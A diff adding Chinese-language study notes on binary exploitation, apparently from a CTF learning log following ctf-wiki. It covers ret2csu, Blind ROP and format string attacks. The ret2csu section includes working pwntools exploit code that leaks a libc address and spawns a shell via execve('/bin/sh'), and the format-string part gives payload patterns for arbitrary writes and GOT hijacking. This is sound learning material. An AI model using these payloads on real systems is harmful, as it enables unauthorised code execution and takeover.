@@ -86,3 +86,131 @@ main
 
 这个就对应ret2libc的example 3的操作
 
+### Day 2
+**ret2csu**: 理念上和basic rop是一样的，但是用的gadget不一样，因此会更复杂一点。
+这里利用的是`__libc_csu_init`中的gadgets。两个gadget分别是
+```text
+.text:0000000000400600                 mov     rdx, r13
+.text:0000000000400603                 mov     rsi, r14
+.text:0000000000400606                 mov     edi, r15d
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]
+.text:000000000040060D                 add     rbx, 1
+.text:0000000000400611                 cmp     rbx, rbp
+.text:0000000000400614                 jnz     short loc_400600
+...
+.text:0000000000400616                 add     rsp, 8
+.text:000000000040061A                 pop     rbx
+.text:000000000040061B                 pop     rbp
+.text:000000000040061C                 pop     r12
+.text:000000000040061E                 pop     r13
+.text:0000000000400620                 pop     r14
+.text:0000000000400622                 pop     r15
+.text:0000000000400624                 retn
+```
+第一部分从r13-r15中获取rdx, rsi, edi然后调用`r12`指向的函数(`r12`应该储存一个指向函数的指针，而不是直接储存函数地址)
+写入`edi`只会写入low32b，而high32b会被清空，但在这里问题不大。
+第二部分从stack上pop出如上的这些registers的值。
+然后直接看ctfwiki上的exploit:
+```py
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = b'a' * 0x80 + fakeebp
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
+        r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += b'a' * 0x38
+    payload += p64(last)
+    sh.send(payload)
+    time.sleep(1)
+
+# 实际上应该写成
+def csu_call(rbx=0, rbp=1, pointer_to_func, arg3, arg2, arg1, back_to)
+```
+几个点:
+* 先进入第二个gadget，控制register的值，然后return到第一个gadget
+* `'a' * 0x38`是因为我们不会执行`jnz`，而是在第一个gadget执行完回到第二个gadget，执行`add rsp,8`开始的instructions，因此我们需要pad `8+8*6=56=0x38`个bytes。最后再回到`last`指定的位置
+
+
+
+然后我们来看几个csu的call
+```py
+sh.recvuntil(b'Hello, World\n')
+csu(0, 1, write_got, 8, write_got, 1, main_addr)
+```
+等价于`write(1, write_got, 8)`，即向`stdout`(1) 写入`8` bytes的值，值为`write_got`(即`write`在got中储存的地址)
+当然最终需要回到`main`来进行下一步exploit
+
+```py
+write_addr = u64(sh.recv(8))
+log.info(f"Leaked write address: {hex(write_addr)}")
+
+libc_base = write_addr - libc.symbols['write']
+log.success(f"Libc base address: {hex(libc_base)}")
+
+execve_addr = libc_base + libc.symbols['execve']
+log.success(f"Execve address: {hex(execve_addr)}")
+# 上面的计算获取offset和execve的地址
+
+sh.recvuntil(b'Hello, World\n')
+csu(0, 1, read_got, 16, bss_base, 0, main_addr)
+sh.send(p64(execve_addr) + b'/bin/sh\x00')
+```
+上面这个call相当于`read(0, bss_base, 16)`，即从`stdin`(0)读取`16` bytes到`bss_base`。
+而后写入地址，8byte的`execve_addr`和8byte的`"/bin/sh\0"`
+这是因为`r12`需要一个pointer to function，因此我们必须先找个地方存下这个pointer
+
+```py
+sh.recvuntil(b'Hello, World\n')
+csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
+sh.interactive()
+```
+这个就简单了，相当于`*bss_base("/bin/sh", 0, 0)`，即`execve("/bin/sh", 0, 0)`。
+
+文中还介绍了一个技巧: CPU的instruction decode并不会管哪里是boundary
+假设我们有一条instruction
+```asm
+41 5d    pop r13
+```
+如果从当中开始decode，那么
+```asm
+5d       pop rbp
+```
+也就是加了这个`41` 相当于给register的index加了8。
+更重要的是x86的instruction本身是variable length的，也就是说一个instruction从当中切开，前面是prefix而后面还是一个完整的instruction。而cpu会直接执行这个完整的instruction，不会再往后面读。所以，后续的指令并不会被我们这个从中间切开的地址影响。
+
+**BROP** Blind ROP
+攻击条件是有stackoverflow，并且服务器crash后重启地址不变，即ASLR只有最初启动时有用。
+首先暴力枚举溢出长度直到程序crash。按照byte一个个进行爆破，64b最多需要$2^8\times 8 = 2048$次
+这个exploit比较复杂
+
+然后需要寻找能用的gadgets。
+* stop gadgets，即程序进入这个状态后会无限循环而不会crash。这样attacker才能知道自己猜到了对的gadget
+* trap gadgets, 进入后程序立刻crash的gadget.
+* brop gadgets, 能控制传参的gadget，典型例子为csu尾部的rop chain
+
+在stack上摆放stop/trap gadgets，不断probe。通过程序是否crash来找出不会pop stack的gadget; 只pop一个variable的gadget; ...
+如果probe本身是个stop gadgets，只要后面都是trap gadgets就可以发现。
+
+寻找plt：plt表结构规整，大部分plt调用都不太会crash。如果发现连续的16B对齐地址都没crash，+6后也不crash，那么就要怀疑是否碰到了plt
+然后需要确认plt中的`strcmp`(或其他类似函数)，用来控制rdx，而后寻找`write`或者`puts`之类的输出函数(write需要3个参数，因此需要`strcmp`或其他函数来控制rdx)。`strcmp`只有在两个参数都不是bad address的时候才会执行，这个性质可以用来确定哪个表项是`strcmp`
+
+后面的例子比较复杂，之后可以重新review一下
+
+**Format String Vulnerability**: 这个比较简单。如果用户可以控制format string，那么首先可以用大量`%s`来让程序crash，也可以直接dump stack上的内容，甚至可以用`%n`进行任意写。
+
+总体思想就是padding+address+写入。比如
+`[addr]%012d%6$n`
+先写address，然后需要知道我们的format string在stack上的位置，这里是第6个format arg，所以我们用`%6$n`来把值写入第六个argument代表的pointer(即`addr`)，然后用`%012d`进行padding，把值pad到16，或者其他我们希望写入的值。
+另外address不一定需要放在最前面。比如我们希望写入`2`，那也可以直接`aa%8$n[addr]`之类的(`8`是随便写的数字)
+对于写入大数字，我们倾向于用`%hhn`(单byte)和`%hn`(双byte)
+
+在例子一节里介绍的攻击：
+* hijack GOT，直接把puts之类的函数的got项修改为system或其他危险函数的地址，在下次执行puts时就会直接执行system
+* hijact return address，获得offset，然后直接修改return address到想要的地方
+* 堆上字符串，将栈迁移上堆(stack pivoting)。这个比较麻烦，需要寻找很多地址。因为format string在heap上也就意味着往stack上一直读并不会读到format string自身，也就没办法直接在format string里面注入一个address。但是在这个example里，saved ebp本身会被当作format argument读到。但因为我们只能直接往saved ebp写，也就意味着我们不能用`hhn`之类的手段，只能一次写完，这可能导致exploit失败
